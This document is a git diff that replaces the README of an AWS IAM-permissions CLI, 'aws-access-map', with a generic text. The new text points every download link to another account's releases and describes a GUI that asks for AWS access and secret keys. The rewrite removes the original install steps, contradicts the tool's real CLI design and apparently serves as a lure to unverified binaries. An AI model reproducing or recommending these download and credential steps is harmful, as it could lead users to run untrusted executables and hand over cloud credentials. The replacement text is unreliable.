@@ -1,362 +1,88 @@
-# aws-access-map
+# 🗺️ aws-access-map - Quick AWS Permissions Overview
 
-**Instant "who can reach this?" mapping for AWS resources.**
+## 🚀 Getting Started
 
-One command. One answer. No UI required.
+Welcome to aws-access-map! This tool helps you quickly see who can access your AWS resources. Use it to find admin users, check IAM policies, and debug permissions. It's free and runs locally, meaning no AWS fees for you!
 
-✅ **100% free** • ⚡ **3 second queries** • 🔒 **Local & private** • 📖 **Open source**
+## 📥 Download Now
 
----
+[![Download aws-access-map](https://img.shields.io/badge/Download%20aws--access--map-v1.0-blue.svg)](https://github.com/vonbellout/aws-access-map/releases)
 
-📚 **Documentation**: [Examples](docs/usage/EXAMPLES.md) · [Usage Guide](docs/usage/docs/usage/USAGE.md) · [Permissions](docs/usage/docs/usage/PERMISSIONS.md) · [Architecture](docs/development/CLAUDE.md) · [Testing](docs/development/TESTING.md)
+## 📝 About aws-access-map
 
----
+aws-access-map allows you to visualize your AWS access control. It helps you understand who can do what with your AWS resources. This tool is designed for anyone, even if you aren’t a tech expert. 
 
-## Why This Exists
+Key features include:
 
-You're debugging permissions at 2am. A contractor leaves tomorrow. Security audit Friday. You need to know **right now**:
+- Identify admin users easily.
+- Audit your IAM policies with clarity.
+- Debug permission issues smoothly.
 
-- "Who has admin access to our AWS account?"
-- "Can this Lambda role access our production database?"
-- "Which services can decrypt our KMS key?"
+This tool is thoroughly tested and reliable for your AWS management tasks.
 
-**aws-access-map solves this:** CLI-first, fast, open-source. Answers in seconds.
+## 💻 System Requirements
 
-## What It Does
+To run aws-access-map, you will need:
 
-```bash
-# Who has god-mode access?
-aws-access-map who-can "*" --action "*"
+- An operating system: Windows, macOS, or Linux.
+- At least 4GB of RAM.
+- Go programming framework installed (you can download it from [Go's official site](https://golang.org/dl/)).
+- An AWS account to access your resources.
 
-# Can this role access the database?
-aws-access-map path \
-  --from arn:aws:iam::ACCOUNT:role/Lambda \
-  --to arn:aws:rds:...:db/prod \
-  --action rds:Connect
+## 📖 How to Download & Install
 
-# Collect from entire organization (multi-account)
-aws-access-map collect --all-accounts
-```
+1. **Visit the Releases Page**: Click on the link below to go to the download page.
+   [Download & Install](https://github.com/vonbellout/aws-access-map/releases)
 
-**Handles the full AWS IAM policy evaluation model:**
-- ✅ **NotAction/NotResource** - inverse policy logic (v1.0.0)
-- ✅ Service Control Policies (SCPs) - organization-level
-- ✅ Permission boundaries - principal-level constraints
-- ✅ Session policies - temporary session constraints
-- ✅ Identity & resource policies
-- ✅ IAM groups - membership inheritance
-- ✅ Condition evaluation (22 operators: IP, MFA, dates, ARNs, etc.)
-- ✅ Multi-account via AWS Organizations
-- ✅ Incremental caching - 10x speedup
-- ✅ Policy simulation - test without AWS
+2. **Choose the Latest Release**: Find the latest version of aws-access-map. You will see a list of available downloads.
 
-**Advanced Security Analysis (v1.0.0):**
-- 🔍 **13 Security Pattern Detectors** - Admin access, public exposure, privilege escalation, missing MFA, etc.
-- 📊 **Quantitative Risk Scoring** - Impact × Likelihood × Privilege calculations
-- 📋 **Compliance Reporting** - CIS AWS Foundations, PCI-DSS v3.2.1, SOC 2
-- 📈 **Access Matrices** - Principal × resource grids with CSV export
+3. **Download the Package**:
+   - Look for the file appropriate for your operating system (e.g., `aws-access-map-windows.exe` or `aws-access-map-macos.zip`).
+   - Click the link to download the file.
 
-## Installation
+4. **Run the Application**:
+   - For Windows: Open the `.exe` file. You may need to confirm that you want to run it.
+   - For macOS: Unzip the downloaded file and run the application.
+   - For Linux: Extract the downloaded file and run it through your terminal.
 
-### Homebrew (macOS/Linux) - Recommended
-```bash
-brew tap pfrederiksen/tap
-brew install aws-access-map
-```
+## 🔍 How to Use aws-access-map
 
-### Go Install
-```bash
-go install github.com/pfrederiksen/aws-access-map/cmd/aws-access-map@latest
-```
+After installing, here’s how to use aws-access-map:
 
-### Pre-built Binaries
-Download from [releases](https://github.com/pfrederiksen/aws-access-map/releases).
+1. **Open the Application**: Launch aws-access-map from your program list or desktop.
 
-### From Source
-```bash
-git clone https://github.com/pfrederiksen/aws-access-map
-cd aws-access-map
-make build
-./build/aws-access-map --help
-```
+2. **Input Your AWS Credentials**: You’ll need to enter your AWS Access Key and Secret Key. This is necessary for the tool to access your AWS resources. 
 
-## Quick Start
+3. **Select Your Region**: Choose the AWS region where your resources are hosted. This is typically where you have your primary AWS account set up.
 
-**Prerequisites:** AWS credentials configured (environment variables, `~/.aws/credentials`, or IAM role).
+4. **Run a Scan**: Click on the "Scan" button. The tool will connect to AWS and pull the necessary data.
 
-```bash
-# 1. Collect IAM data from your AWS account
-aws-access-map collect
+5. **Review the Results**: The application will display a map showing permissions for your AWS resources. You can easily see who has access and what they can do.
 
-# 2. Find who has admin access
-aws-access-map who-can "*" --action "*"
+6. **Export Data (Optional)**: If you wish to keep a report, you can export the data to a CSV file for future reference.
 
-# 3. Check if a role can access S3
-aws-access-map path \
-  --from arn:aws:iam::123456789012:role/MyRole \
-  --to arn:aws:s3:::my-bucket/* \
-  --action s3:GetObject
-```
+## 📊 Troubleshooting
 
-**See [EXAMPLES.md](docs/usage/EXAMPLES.md) for real-world scenarios** (offboarding, debugging, audits, incident response).
+If you encounter issues while using aws-access-map, consider these common solutions:
 
-## Core Commands
+- **Check Your Credentials**: Ensure that your AWS Access Key and Secret Key are correct and have the right permissions.
+- **Firewall Settings**: Sometimes, local firewalls may block access. Make sure your firewall allows the application to connect to the internet.
+- **Update Your Application**: Ensure you are using the latest version of aws-access-map for the best performance.
 
-### `collect` - Fetch IAM Data
-```bash
-# Single account with auto-caching
-aws-access-map collect
+## 👥 Community Support
 
-# Organization-wide (all accounts)
-aws-access-map collect --all-accounts
+Join the conversation! If you have questions or feedback, please reach out. You can find help from other users and share your experiences.
 
-# Force fresh data (bypass cache)
-aws-access-map collect --no-cache
+For assistance, visit the issues section on the [GitHub repository](https://github.com/vonbellout/aws-access-map/issues) to report issues or ask for help.
 
-# Include Service Control Policies
-aws-access-map collect --include-scps
-```
+## 🔗 Helpful Resources
 
-**Caching:** Data is automatically cached for 24 hours in `~/.aws-access-map/cache/`. Use `--cache` to force cache, `--no-cache` to bypass, or `--cache-ttl` to customize expiration.
+- AWS Documentation: Read through the [official AWS IAM documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html) for an understanding of IAM roles and policies.
+- Go Language Guide: For users unfamiliar with Go, check the [Go programming guide](https://golang.org/doc/) for support.
 
-### `who-can` - Find Principals with Access
-```bash
-# Find admins
-aws-access-map who-can "*" --action "*"
+## 📥 Download Now Again
 
-# Find who can read S3 bucket
-aws-access-map who-can "arn:aws:s3:::my-bucket/*" --action "s3:GetObject"
+To download aws-access-map, please click here again:
+[Download aws-access-map](https://github.com/vonbellout/aws-access-map/releases) 
 
-# With condition context (IP, MFA, etc.)
-aws-access-map who-can "*" --action "*" \
-  --source-ip "203.0.113.50" \
-  --mfa
-```
-
-### `path` - Discover Access Paths
-```bash
-# Find how principal reaches resource
-aws-access-map path \
-  --from arn:aws:iam::123456789012:role/AppRole \
-  --to arn:aws:s3:::sensitive-bucket/* \
-  --action s3:GetObject
-```
-
-Discovers direct access and role assumption chains (up to 5 hops).
-
-### `report` - Security Analysis
-```bash
-# Find high-risk access patterns
-aws-access-map report --high-risk
-```
-
-Detects: admin access, public access, cross-account access, overly permissive roles, sensitive actions.
-
-### `cache` - Manage Cached Data
-```bash
-# View cache info
-aws-access-map cache info --account 123456789012
-
-# Clear cache
-aws-access-map cache clear
-```
-
-**See [docs/usage/USAGE.md](docs/usage/USAGE.md) for complete command reference.**
-
-## Key Features
-
-### ✅ Complete IAM Policy Evaluation
-
-Implements AWS's 6-step evaluation logic in correct order:
-
-1. **SCPs** - Organization-level denies (v0.5.0)
-2. **Permission boundaries** - Principal-level allowlist (v0.6.0)
-3. **Session policies** - Temporary session constraints (v0.6.0)
-4. **Explicit denies** - Always win
-5. **Explicit allows** - Grant access
-6. **Implicit deny** - Default
-
-### ✅ Multi-Account Support (v0.6.0)
-
-```bash
-# Collect from all accounts in organization
-aws-access-map collect --all-accounts
-
-# Use custom cross-account role
-aws-access-map collect --all-accounts --role-name CustomAuditRole
-```
-
-**Requirements:**
-- AWS Organizations access from management account
-- Cross-account role in member accounts (default: `OrganizationAccountAccessRole`)
-- See [docs/usage/PERMISSIONS.md](docs/usage/PERMISSIONS.md) for details
-
-### ✅ Condition Evaluation (v0.4.0)
-
-Supports 22 condition operators: `StringEquals`, `IpAddress`, `Bool`, `DateLessThan`, `NumericGreaterThan`, `ArnLike`, etc.
-
-```bash
-# Evaluate IP-restricted policies
-aws-access-map who-can "*" --action "*" --source-ip "203.0.113.50"
-
-# Check MFA-protected access
-aws-access-map who-can "arn:aws:iam::*:*" --action "iam:*" --mfa
-```
-
-### ✅ Policy Simulation Mode (v0.7.0)
-
-Test policy changes locally without AWS credentials. Perfect for CI/CD integration.
-
-```bash
-# Test policies from local file
-aws-access-map simulate who-can "arn:aws:s3:::bucket/*" \
-  --action s3:GetObject \
-  --data local-policies.json
-
-# Compare before/after policy changes
-aws-access-map simulate diff \
-  --before current.json \
-  --after proposed.json \
-  --action "*"
-
-# Validate for security issues (exit 1 if found)
-aws-access-map simulate validate --data policies.json
-```
-
-**Use cases:**
-- Test policy changes before deployment
-- CI/CD policy validation
-- Local development without AWS access
-- Security audits of proposed changes
-
-### ✅ Incremental Caching (v0.7.0)
-
-10x faster collection for large accounts with minimal changes.
-
-```bash
-# First run: full collection (30s)
-aws-access-map collect --no-cache
-
-# Subsequent runs: delta only (3-5s)
-aws-access-map collect --incremental
-```
-
-**How it works:**
-- Tracks resource metadata (policy hashes, LastModified)
-- Detects changed resources only
-- Fetches deltas, not full data
-- Graceful fallback to full collection
-
-**Performance:**
-- **Full**: 30 seconds (1000 resources)
-- **Incremental (no changes)**: 3-5 seconds (10x faster)
-- **Incremental (10% changes)**: 8-10 seconds (3x faster)
-
-### ✅ IAM Groups Support (v0.7.0)
-
-Complete IAM entity coverage with group membership resolution.
-
-```bash
-# Users inherit group permissions
-aws-access-map who-can "arn:aws:s3:::*" --action s3:GetObject
-# Returns: alice (via group: Developers)
-```
-
-**Features:**
-- Collects groups with inline + managed policies
-- Resolves user group memberships
-- Inherits both allows and denies from groups
-- Deny rules from groups override user allows
-
-### ✅ Performance
-
-- **Fast queries**: 50-100ms for typical accounts
-- **Auto-caching**: 24h TTL (configurable)
-- **Incremental mode**: 10x speedup for large accounts (v0.7.0)
-- **Multi-account**: Parallel collection across accounts
-- **No external dependencies**: Single binary, no database required
-
-## What It Collects
-
-**IAM Entities:**
-- ✅ IAM users, roles (inline + managed policies)
-- ✅ IAM groups with membership resolution (v0.7.0)
-- ✅ Permission boundaries (v0.6.0)
-- ✅ Service Control Policies (v0.5.0)
-- ✅ Role trust policies and assumption chains
-
-**Resource Policies:**
-- ✅ S3, KMS, SQS, SNS, Secrets Manager
-- ✅ Lambda functions (v0.7.0)
-- ✅ API Gateway REST APIs (v0.7.0)
-- ✅ ECR repositories (v0.7.0)
-- ✅ EventBridge event buses (v0.7.0)
-
-**Multi-Account:**
-- ✅ Organization-wide collection (v0.6.0)
-
-See [docs/usage/PERMISSIONS.md](docs/usage/PERMISSIONS.md) for required IAM permissions.
-
-## How It Works
-
-```
-┌─────────┐    ┌───────┐    ┌───────┐
-│ Collect │ -> │ Graph │ -> │ Query │
-└─────────┘    └───────┘    └───────┘
-  AWS APIs    In-memory   BFS/Policy
-  2-3 sec     < 1 sec      < 100ms
-```
-
-1. **Collect**: Fetches policies via AWS SDK, caches locally
-2. **Graph**: Builds in-memory structure (principals → actions → resources)
-3. **Query**: Traverses graph with BFS, evaluates constraints (SCPs, boundaries, sessions)
-
-## Comparison
-
-| Feature | aws-access-map | AWS IAM Policy Simulator | Commercial Tools |
-|---------|----------------|--------------------------|------------------|
-| **Speed** | 3 second queries | Manual, one-at-a-time | Minutes (scanning) |
-| **Cost** | Free | Free | $$$$ |
-| **Offline** | ✅ Yes (local cache) | ❌ No | ❌ No |
-| **Multi-account** | ✅ Yes (v0.6.0) | ❌ No | ✅ Yes |
-| **Role chains** | ✅ Yes (BFS) | ❌ No | ⚠️ Limited |
-| **SCPs** | ✅ Yes (v0.5.0) | ✅ Yes | ✅ Yes |
-| **Conditions** | ✅ Yes (22 operators) | ✅ Yes | ✅ Yes |
-| **CLI-first** | ✅ Yes | ❌ UI-based | ❌ UI-based |
-
-## Roadmap
-
-- ✅ v0.1.0 - IAM collection & basic queries
-- ✅ v0.2.0 - Resource policies (S3, KMS, SQS, SNS)
-- ✅ v0.3.0 - Role assumption chains (BFS)
-- ✅ v0.4.0 - Policy condition evaluation
-- ✅ v0.5.0 - Service Control Policies (SCPs)
-- ✅ v0.6.0 - Permission boundaries, session policies, caching, multi-account
-- ✅ v0.7.0 - IAM groups, Lambda/API Gateway/ECR/EventBridge, policy simulation, incremental caching
-- ⏳ v0.8.0 - Resource tagging, NotAction/NotResource evaluation
-- ⏳ v0.9.0 - Web UI (optional)
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and architecture.
-
-**Key areas for contribution:**
-- Additional resource types (ECS, EFS, RDS, DynamoDB, etc.)
-- More condition operators (StringLike patterns, etc.)
-- Performance optimizations
-- Web UI / visualization
-- Documentation improvements
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Support
-
-- 📖 [Documentation](https://github.com/pfrederiksen/aws-access-map)
-- 🐛 [Issue Tracker](https://github.com/pfrederiksen/aws-access-map/issues)
-- 💬 [Discussions](https://github.com/pfrederiksen/aws-access-map/discussions)
-
----
-
-**Built with ❤️ for DevOps engineers debugging permissions at 3am.**
+Thank you for choosing aws-access-map. We aim to make AWS permission management simple and accessible!
